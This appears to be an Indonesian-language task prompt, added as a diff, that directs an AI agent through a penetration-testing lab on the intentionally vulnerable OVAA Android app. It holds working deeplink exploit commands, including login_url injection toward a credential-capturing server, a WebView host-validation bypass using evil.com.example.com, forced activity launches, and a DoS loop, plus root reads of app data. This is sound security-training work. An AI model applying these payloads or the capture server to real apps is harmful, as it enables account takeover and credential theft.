@@ -1,0 +1,194 @@
+Jalankan lab OVAA Deeplink Exploitation & Account Takeover secara penuh dari awal hingga akhir.
+
+## KONTEKS
+Anda adalah AI security researcher yang melakukan penetration testing pada aplikasi Android OVAA (Oversecured Vulnerable Android App). Target: package oversecured.ovaa, tersedia di GitHub.
+
+## ENVIRONMENT
+- Working directory: /home/d4x13/Documents/MYPROJECT/TOOLS/userfull-mobile/Deeplink
+- Java: /usr/lib/jvm/java-21-openjdk-amd64
+- Android SDK: /home/d4x13/Android/Sdk
+- Emulator: Google Pixel x86_64, API 36, Rooted (adb devices)
+- Tools: adb, maestro, gradlew, python3
+
+## TAHAP 1: SETUP & BUILD
+
+1. Clone OVAA repository jika belum ada:
+   cd /tmp && git clone https://github.com/oversecured/ovaa.git && cd ovaa
+
+2. Konfigurasi SDK:
+   echo "sdk.dir=/home/d4x13/Android/Sdk" > local.properties
+
+3. Tambahkan android:usesCleartextTraffic="true" ke <application> di AndroidManifest.xml
+   agar HTTP POST ke server attacker tidak diblokir oleh cleartext policy Android API 36.
+
+4. Build APK:
+   export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
+   export ANDROID_SDK_ROOT=/home/d4x13/Android/Sdk
+   chmod +x gradlew && ./gradlew assembleDebug --no-daemon
+
+5. Install ke emulator:
+   adb install -r app/build/outputs/apk/debug/app-debug.apk
+
+6. Verifikasi:
+   adb shell pm list packages | grep ovaa
+   adb shell su root id (pastikan uid=0)
+
+## TAHAP 2: START ATTACKER SERVER
+
+Jalankan server Python pada port 8080 untuk menangkap kredensial yang dikirim OVAA via POST.
+Server harus:
+- Listen di 0.0.0.0:8080
+- Menerima POST /steal dengan JSON body {"email":"...","password":"..."}
+- Menyediakan GET /view yang menampilkan kredensial dalam halaman HTML
+- Menyimpan hasil tangkapan ke evidence/captured_credentials.txt
+
+Gunakan: python3 steal_server.py (atau buat file ini jika belum ada)
+Jalankan di background: nohup python3 steal_server.py > /tmp/steal.log 2>&1 &
+
+## TAHAP 3: EKSPLOITASI TC01 - Arbitrary login_url Injection
+
+1. Clear aplikasi dan logcat:
+   adb shell pm clear oversecured.ovaa
+   adb logcat -c
+
+2. Kirim deeplink untuk injeksi login_url:
+   adb shell am start -a android.intent.action.VIEW \
+     -d "oversecured://ovaa/login?url=http://10.0.2.2:8080/steal" \
+     oversecured.ovaa
+
+3. Verifikasi login_url berubah di SharedPreferences:
+   adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
+   Harus muncul: <string name="login_url">http://10.0.2.2:8080/steal</string>
+
+## TAHAP 4: EKSPLOITASI TC02 - WebView Host Validation Bypass
+
+Kirim deeplink untuk bypass validasi host:
+   adb shell am start -a android.intent.action.VIEW \
+     -d "oversecured://ovaa/webview?url=https://evil.com.example.com/steal" \
+     oversecured.ovaa
+
+Verifikasi bahwa WebViewActivity terpicu (cek logcat/dumpsys).
+
+## TAHAP 5: EKSPLOITASI TC03 - Credential Leakage + Network Capture
+
+1. Launch aplikasi ke login screen:
+   adb shell monkey -p oversecured.ovaa -c android.intent.category.LAUNCHER 1
+   sleep 3
+
+2. Input email victim@company.com:
+   - Tap email field: adb shell input tap 710 479; sleep 0.3
+   - Ketik "victim": adb shell input text "victim"
+   - Ketik "@": adb shell input keyevent 77
+   - Ketik "company": adb shell input text "company"
+   - Ketik ".": adb shell input keyevent 56
+   - Ketik "com": adb shell input text "com"
+
+3. Input password SuperSecret123!:
+   - Tap password field: adb shell input tap 710 660; sleep 0.3
+   - Ketik "SuperSecret123": adb shell input text "SuperSecret123"
+   - Ketik "!": adb shell input text '\!'  (gunakan single quote + backslash)
+
+4. Tutup keyboard (keyboard menutupi tombol LOGIN):
+   adb shell input keyevent 4
+   sleep 1.5
+
+5. Klik tombol LOGIN:
+   adb shell input tap 540 2096
+   sleep 4
+
+6. Verifikasi login berhasil - MainActivity harus tampil:
+   adb shell dumpsys activity top | grep ACTIVITY
+
+## TAHAP 6: EKSPLOITASI TC04 - Arbitrary Activity Launch
+
+1. Launch MainActivity langsung (bypass login):
+   adb shell am start -a oversecured.ovaa.action.ACTIVITY_MAIN oversecured.ovaa
+
+2. Launch LoginActivity langsung:
+   adb shell am start -a oversecured.ovaa.action.LOGIN oversecured.ovaa
+
+## TAHAP 7: EKSPLOITASI TC05 - State Inconsistency / DoS
+
+Kirim 5x sekuens deeplink secara cepat:
+   for i in 1 2 3 4 5; do
+     adb shell am start -a android.intent.action.VIEW \
+       -d "oversecured://ovaa/logout" oversecured.ovaa
+     sleep 0.1
+     adb shell am start -a android.intent.action.VIEW \
+       -d "oversecured://ovaa/login?url=http://evil${i}.com/" oversecured.ovaa
+     sleep 0.1
+   done
+
+Periksa crash: adb logcat -d | grep -iE "crash|FATAL|ANR"
+
+## TAHAP 8: KUMPULKAN BUKTI DIGITAL
+
+Buat folder evidence/ dan simpan SEMUA bukti:
+
+1. SharedPreferences (manipulasi login_url):
+   adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml \
+     > evidence/shared_prefs_final.xml
+
+2. Logcat (kebocoran kredensial):
+   adb logcat -d | grep "Processing" > evidence/logcat_credential_leak.txt
+
+3. Network Capture - Web View:
+   curl -s http://127.0.0.1:8080/view > evidence/web_view_capture.html
+
+4. Network Capture - Raw:
+   cat evidence/captured_credentials.txt 2>/dev/null
+
+5. Screenshot final:
+   adb exec-out screencap -p > evidence/final_state.png
+
+6. Verifikasi file evidence:
+   ls -la evidence/
+
+## TAHAP 9: BUAT LAPORAN
+
+Buat file LAPORAN_EKSPLOITASI_OVAA.txt yang berisi:
+- Root cause setiap kerentanan dengan referensi file:line
+- Bukti eksploitasi (referensi file di evidence/)
+- CVSS scoring: TC01=9.8, TC02=8.2, TC03=7.5, TC04=7.8, TC05=5.3
+- Perintah eksploitasi yang digunakan
+- Rekomendasi perbaikan
+
+## TAHAP 10: VERIFIKASI AKHIR
+
+1. Pastikan semua 5 TC tervalidasi
+2. Pastikan 3 vektor bukti kebocoran kredensial terkonfirmasi:
+   - Logcat: D/ovaa: Processing victim@company.com:SuperSecret123!
+   - Network: {"email":"victim@company.com","password":"SuperSecret123!"}
+   - SharedPreferences: <string name="password">SuperSecret123!</string>
+3. Pastikan semua file tersimpan di working directory
+4. Tampilkan ringkasan akhir dengan status PASS/FAIL per TC
+
+## OUTPUT YANG DIHARAPKAN
+Setelah menyelesaikan semua tahap, tampilkan output ringkasan:
+```
+╔══════════════════════════════════════════════════════════════╗
+║     OVAA DEEPLINK EXPLOITATION - FINAL REPORT               ║
+╠══════════════════════════════════════════════════════════════╣
+║  TC01: Arbitrary login_url Injection          ✅ VALIDATED  ║
+║  TC02: WebView Host Validation Bypass         ✅ VALIDATED  ║
+║  TC03: Credential Leakage (log+network)       ✅ VALIDATED  ║
+║  TC04: Arbitrary Activity Launch              ✅ VALIDATED  ║
+║  TC05: State Inconsistency / DoS              ✅ VALIDATED  ║
+╠══════════════════════════════════════════════════════════════╣
+║  Credentials Captured:                                     ║
+║    email:    victim@company.com                             ║
+║    password: SuperSecret123!                                ║
+╠══════════════════════════════════════════════════════════════╣
+║  Evidence: ./evidence/                                      ║
+║  Web View: http://127.0.0.1:8080/view                       ║
+╚══════════════════════════════════════════════════════════════╝
+```
+
+## CATATAN PENTING
+- Karakter @ dan ! TIDAK bisa via 'adb shell input text' biasa. Gunakan:
+  - @ → adb shell input keyevent 77
+  - ! → adb shell input text '\!'  (zsh: single quote + backslash)
+- Keyboard Android menutupi tombol LOGIN. Selalu tutup keyboard (keyevent 4) sebelum tap tombol.
+- 10.0.2.2 adalah alamat host machine dari perspektif emulator Android.
+- Emulator HARUS rooted untuk membaca /data/data/oversecured.ovaa/shared_prefs/
+- Android API 36 memblokir cleartext HTTP. usesCleartextTraffic="true" WAJIB ditambahkan.
